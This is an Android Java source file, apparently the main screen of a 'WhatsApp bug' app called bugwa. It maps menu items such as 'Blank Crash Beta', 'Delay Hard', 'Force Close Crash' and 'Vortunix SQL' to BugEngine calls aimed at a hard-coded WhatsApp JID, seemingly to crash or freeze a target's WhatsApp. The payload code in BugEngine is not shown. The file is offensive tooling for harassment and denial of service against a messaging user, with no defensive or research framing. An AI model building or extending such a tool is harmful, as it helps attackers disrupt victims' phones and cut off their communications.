package com.xorus.bugwa;

import android.os.Bundle;
import android.widget.Button;
import android.widget.ListView;
import androidx.appcompat.app.AppCompatActivity;
import java.util.ArrayList;
import java.util.HashMap;

public class MainActivity extends AppCompatActivity {
    private BugEngine engine;
    private String targetJid = "6281234567890@s.whatsapp.net";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        engine = new BugEngine(this);
        
        // Menu bug mapping
        HashMap<String, Runnable> bugMap = new HashMap<>();
        bugMap.put("Blank Crash Beta", () -> engine.executeBlankCrlBeta(targetJid));
        bugMap.put("Blank Home", () -> engine.executeBlankHome(targetJid));
        bugMap.put("Delay Hard", () -> engine.executeDelayHard(targetJid));
        bugMap.put("Delay Dark", () -> engine.executeDelayDark(targetJid));
        bugMap.put("Delay X", () -> engine.executeDelayX(targetJid));
        bugMap.put("Force Click", () -> engine.executeForceClick(targetJid));
        bugMap.put("Force Close Blank", () -> engine.executeForceCloseBlank());
        bugMap.put("Force Close Crash", () -> engine.executeForceCloseCrash());
        bugMap.put("Force Close Invis", () -> engine.executeForceCloseInvis(5));
        bugMap.put("Vortunix SQL", () -> engine.executeVortunixSql(targetJid));
        
        // Setup UI
        ListView menuList = findViewById(R.id.menuList);
        BugMenuAdapter adapter = new BugMenuAdapter(this, new ArrayList<>(bugMap.keySet()));
        menuList.setAdapter(adapter);
        
        menuList.setOnItemClickListener((parent, view, position, id) -> {
            String key = (String) parent.getItemAtPosition(position);
            bugMap.get(key).run();
        });
    }
}